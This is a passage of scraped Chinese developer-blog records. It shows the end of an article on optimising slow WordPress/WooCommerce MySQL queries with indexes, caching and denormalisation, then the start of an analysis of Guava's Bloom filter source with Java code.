src=\"http://jbcdn2.b0.upaiyun.com/2017/12/1f0eaebba78bc7b76b03d765fdeed020.png\"></p>\n<p>哇，干的漂亮！我们成功的添加了索引并将查询的时间缩短了5s.</p>\n<h3>了解你的查询语句</h3>\n<p>检查下查询语句——看看每一个join，每一个子查询。它们做了它们不该做的事了吗？这里能做什么优化吗？</p>\n<p>这个例子中，我们把licenses 表和posts 表通过order_id 连接起来同时限制post type 为shop_order。这是为了通过保持数据的完整性来保证我们只使用正确的订单记录，但是事实上这在查询中是多余的。我们知道这是一个关于安全的赌注，在posts 表中software license 行是通过order_id 来跟 WooCommerce order 相关联的，这在PHP 插件代码中是强制的。让我们移除join 来看看有什么提升没有：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/447fc98220e9c37b85807de00e336cb6.png\"></p>\n<p>提升并不算很大但现在查询时间低于3 秒了。</p>\n<h3>缓存一切数据</h3>\n<p>如果你的服务器默认情况下没有使用MySQL查询缓存，那么你应该开启缓存。开启缓存意味着MySQL 会把所有的语句和语句执行的结果保存下来，如果随后有一条与缓存中完全相同的语句需要执行，那么MySQL 就会返回缓存的结果。缓存不会过时，因为MySQL 会在表数据更新后刷新缓存。</p>\n<p>查询监视器发现在加载一个页面时我们的查询语句执行了四次，尽管有MySQL查询缓存很好，但是在一个请求中重复读取数据库的数据是应该完全避免的。你的PHP 代码中的静态缓存很简单并且可以很高效的解决这个问题。基本上，首次请求时从数据库中获取查询结果，并将其存储在类的静态属性中，然后后续的查询语句调用将从静态属性中返回结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc63f4d9531648850\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass WC_Software_Subscription {\r\n\r\n    protected static $subscriptions = array();\r\n\r\n    public static function get_user_subscriptions( $user_id ) {\r\n        if ( isset( static::$subscriptions[ $user_id ] ) ) {\r\n            return static::$subscriptions[ $user_id ];\r\n        }\r\n\r\n        global $wpdb;\r\n\r\n        $sql = '...';\r\n\r\n        $results = $wpdb-&gt;get_results( $sql, ARRAY_A );\r\n\r\n        static::$subscriptions[ $user_id ] = $results;\r\n\r\n        return $results;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc63f4d9531648850-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc63f4d9531648850-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-1\"><span class=\"crayon-t\">class</span> <span class=\"crayon-e\">WC_Software_Subscription</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-3\">    <span class=\"crayon-m\">protected</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">subscriptions</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-t\">array</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-5\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-t\">function</span> <span class=\"crayon-e\">get_user_subscriptions</span><span class=\"crayon-sy\">(</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-6\">        <span class=\"crayon-st\">if</span> <span class=\"crayon-sy\">(</span> <span class=\"crayon-e\">isset</span><span class=\"crayon-sy\">(</span> <span class=\"crayon-m\">static</span><span class=\"crayon-o\">::</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">subscriptions</span><span class=\"crayon-sy\">[</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-sy\">]</span> <span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-7\">            <span class=\"crayon-st\">return</span> <span class=\"crayon-m\">static</span><span class=\"crayon-o\">::</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">subscriptions</span><span class=\"crayon-sy\">[</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-8\">        <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-10\">        <span class=\"crayon-m\">global</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">wpdb</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-12\">        <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">sql</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'...'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-14\">        <span class=\"crayon-sy\">$</span><span class=\"crayon-i\">results</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">wpdb</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">get_results</span><span class=\"crayon-sy\">(</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">sql</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">ARRAY</span><span class=\"crayon-sy\">_</span>A <span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-16\">        <span class=\"crayon-m\">static</span><span class=\"crayon-o\">::</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">subscriptions</span><span class=\"crayon-sy\">[</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">_</span>id <span class=\"crayon-sy\">]</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">results</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-18\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-sy\">$</span><span class=\"crayon-v\">results</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc63f4d9531648850-19\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc63f4d9531648850-20\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>缓存有一个生命周期，具体地说是实例化对象有一个生命周期。如果你正在查看跨请求的查询结果，那么你需要实现一个持久对象缓存。然而不管怎样，你的代码应该负责设置缓存，并且当基础数据变更时让缓存失效。</p>\n<h3>跳出箱子外思考</h3>\n<p>不仅仅是调整查询或添加索引，还有其他方法可以加快查询的执行速度。 我们查询的最慢的部分是从客户ID到产品ID再到加入表格所做的工作，我们必须为每个客户做到。我们是不是可以在需要的时候抓取客户的数据？如果是那样，那我们就只需要加入一次。</p>\n<p>您可以通过创建数据表来存储许可数据，以及所有许可用户标识和产品标识符来对数据进行非规范化（反规范化）处理，并针对特定客户进行查询。 您需要使用INSERT / UPDATE / DELETE上的<a href=\"https://dev.mysql.com/doc/refman/5.7/en/create-trigger.html\" target=\"_blank\" rel=\"nofollow\">MySQL触发器</a>来重建表格（不过这要取决于数据来更改的表格），这会显着提高查询数据的性能。</p>\n<p>类似地，如果一些连接在MySQL中减慢了查询速度，那么将查询分解为两个或更多语句并在PHP中单独执行它们可能会更快，然后可以在代码中收集和过滤结果。 Laravel 通过<a href=\"https://laravel.com/docs/5.5/eloquent-relationships#eager-loading\" target=\"_blank\" rel=\"nofollow\">预加载</a>在 Eloquent 中就做了类似的事情。</p>\n<p>如果您有大量数据和许多不同的自定义帖子类型，WordPress可能会在wp_posts表上减慢查询速度。 如果您发现查询的帖子类型较慢，那么可以考虑从自定义帖子类型的存储模型移动到<a href=\"https://deliciousbrains.com/creating-custom-table-php-wordpress/\" target=\"_blank\" rel=\"nofollow\">自定义表格</a>中 – 更多内容将在后面的文章中介绍。</p>\n<h3>结论</h3>\n<p>通过这些查询优化方法，我们设法将查询从8秒降低到2秒，并且将查询次数从4次减少到1次。需要说明的是，这些查询时间是在我们开发环境运行时记录的 ，生产环境速度会更快。</p>\n<p>这对追踪查询缓慢及其修复等问题是一个有用的指南。 优化查询看起来可能像一个可怕的任务，但只要你尝试一下，并取得一些初步的胜利，你就会开始找到错误，并希望做出进一步改善。</p>\n<p>如果你有任何优化查询的建议或你喜欢使用的工具？ 可以在评论中留言，让我们知道。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113222\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113222votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113222\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/30c9c89359420ef7de32e6e32e9620024a38972b.jpg"}
{"url_object_id": "e8eb842f84448b7433a380c11c41c941", "title": "布隆过滤器:Google Guava类库源码分析及基于Redis Bitmaps的重构", "url": "http://blog.jobbole.com/113396/", "create_date": "2017/12/30", "front_img_url": ["http://www.fullstackyang.com/wp-content/uploads/2017/09/bloom-filter.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 2, "tags": "开发,Bitmaps,BloomFilter,Guava,Redis,布隆过滤器", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/2653yy\">fullstackyang</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><blockquote><p>本文源地址：http://www.fullstackyang.com/archives/464.html，转发请注明该地址或伯乐在线地址，谢谢！</p></blockquote>\n<p><span style=\"font-family: 'Microsoft YaHei', 宋体, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 24px; font-style: normal; font-weight: normal;\">一、背景知识</span></p>\n<p>在网上已经有很多关于布隆过滤器的介绍了，这里就不再赘述，下面简单地提炼几个要点：</p>\n<ol>\n<li>布隆过滤器是用来判断一个元素是否出现在给定集合中的重要工具，具有快速，比哈希表更节省空间等优点，而缺点在于有一定的误识别率（false-positive，假阳性），亦即，它可能会把不是集合内的元素判定为存在于集合内，不过这样的概率相当小，在大部分的生产环境中是可以接受的；</li>\n<li>其原理比较简单，如下图所示，S集合中有n个元素，利用k个哈希函数，将S中的每个元素映射到一个长度为m的位（bit）数组B中不同的位置上，这些位置上的二进制数均置为1，如果待检测的元素经过这k个哈希函数的映射后，发现其k个位置上的二进制数不全是1，那么这个元素一定不在集合S中，反之，该元素可能是S中的某一个元素（参考1）；\n<div><img src=\"http://www.fullstackyang.com/wp-content/uploads/2017/09/bloom-filter.jpg\" alt=\"\" width=\"882\" height=\"476\"></div>\n</li>\n<li>综上描述，那么到底需要多少个哈希函数，以及创建长度为多少的bit数组比较合适，为了估算出k和m的值，在构造一个布隆过滤器时，需要传入两个参数，即可以接受的误判率fpp和元素总个数n（不一定完全精确）。至于参数估计的方法，有兴趣的同学可以参考维基英文页面，下面直接给出公式：<img src=\"http://www.fullstackyang.com/wp-content/uploads/2017/09/km.jpg\" alt=\"\" width=\"346\" height=\"56\"></li>\n<li>哈希函数的要求尽量满足平均分布，这样既降低误判发生的概率，又可以充分利用bit数组的空间；</li>\n<li>\n<div>根据论文《Less Hashing, Same Performance: Building a Better Bloom Filter》提出的一个技巧，可以用2个哈希函数来模拟k个哈希函数，即gi(x) = h1(x) + ih2(x) ，其中0&lt;=i&lt;=k-1；</div>\n</li>\n<li>在吴军博士的《数学之美》一书中展示了不同情况下的误判率，例如，假定一个元素用16位比特，8个哈希函数，那么假阳性的概率是万分之五，这已经相当小了。</li>\n</ol>\n<p>目前已经有相应实现的开源类库，如Google的Guava类库，Twitter的Algebird类库，和ScalaNLP breeze等等，其中Guava 11.0版本中增加了BloomFilter类，它使用了Funnel和Sink的设计，增强了泛化的能力，使其可以支持任何数据类型，其利用murmur3 hash来做哈希映射函数，不过它底层并没有使用传统的java.util.BitSet来做bit数组，而是用long型数组进行了重新封装，大部分操作均基于位的运算，因此能达到一个非常好的性能；下面我们就Guava类库中实现布隆过滤器的源码作详细分析，最后出于灵活性和解耦等因素的考虑，我们想要把布隆过滤器从JVM中拿出来，于是利用了Redis自带的Bitmaps作为底层的bit数组进行重构，另外随着插入的元素越来越多，当实际数量远远大于创建时设置的预计数量时，布隆过滤器的误判率会越来越高，因此在重构的过程中增加了自动扩容的特性，最后通过测试验证其正确性。</p>\n<h2>二、布隆过滤器在Guava中的实现</h2>\n<p>Guava中，布隆过滤器的实现主要涉及到2个类，BloomFilter和BloomFilterStrategies，首先来看一下BloomFilter：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb2a542872533\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n /** The bit set of the BloomFilter (not necessarily power of 2!) */\r\n  private final BitArray bits;\r\n\r\n  /** Number of hashes per element */\r\n  private final int numHashFunctions;\r\n\r\n  /** The funnel to translate Ts to bytes */\r\n  private final Funnel&lt;? super T&gt; funnel;\r\n\r\n  /**\r\n   * The strategy we employ to map an element T to {@ code numHashFunctions} bit indexes.\r\n   */\r\n  private final Strategy strategy;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb2a542872533-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb2a542872533-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb2a542872533-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb2a542872533-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb2a542872533-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb2a542872533-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb2a542872533-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-c\">/** The bit set of the BloomFilter (not necessarily power of 2!) */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb2a542872533-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb2a542872533-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">/** Number of hashes per element */</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb2a542872533-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">/** The funnel to translate Ts to bytes */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb2a542872533-8\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb2a542872533-10\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-11\"><span class=\"crayon-c\">   * The strategy we employ to map an element T to {@ code numHashFunctions} bit indexes.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb2a542872533-12\"><span class=\"crayon-c\">   */</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb2a542872533-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Strategy </span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><!-- [Format Time: 0.0017 seconds] --></p>\n<p>这是它的4个成员变量</p>\n<ul>\n<li>BitArrays是定义在BloomFilterStrategies中的内部类，封装了布隆过滤器底层bit数组的操作，后文详述；</li>\n<li>numHashFunctions表示哈希函数的个数，即上文提到的k；</li>\n<li>Funnel，这是Guava中定义的一个接口，它和PrimitiveSink配套使用，主要是把任意类型的数据转化成Java基本数据类型（primitive value，如char，byte，int……），默认用java.nio.ByteBuffer实现，最终均转化为byte数组；</li>\n<li>Strategy是定义在BloomFilter类内部的接口，代码如下，有3个方法，put（插入元素），mightContain（判定元素是否存在）和ordinal方法（可以理解为枚举类中那个默认方法）</li>\n</ul>\n<p><!-- [Format Time: 0.0029 seconds] --></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb34835679208\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninterface Strategy extends java.io.Serializable {\r\n\r\n    /**\r\n     * Sets {@ code numHashFunctions} bits of the given bit array, by hashing a user element.\r\n     *\r\n     * &lt;p&gt;Returns whether any bits changed as a result of this operation.\r\n     */\r\n    &lt;T&gt; boolean put(T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits);\r\n\r\n    /**\r\n     * Queries {@ code numHashFunctions} bits of the given bit array, by hashing a user element;\r\n     * returns {@ code true} if and only if all selected bits are set.\r\n     */\r\n    &lt;T&gt; boolean mightContain(\r\n        T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits);\r\n\r\n    /**\r\n     * Identifier used to encode this strategy, when marshalled as part of a BloomFilter. Only\r\n     * values in the [-128, 127] range are valid for the compact serial form. Non-negative values\r\n     * are reserved for enums defined in BloomFilterStrategies; negative values are reserved for any\r\n     * custom, stateful strategy we may define (e.g. any kind of strategy that would depend on user\r\n     * input).\r\n     */\r\n    int ordinal();\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div 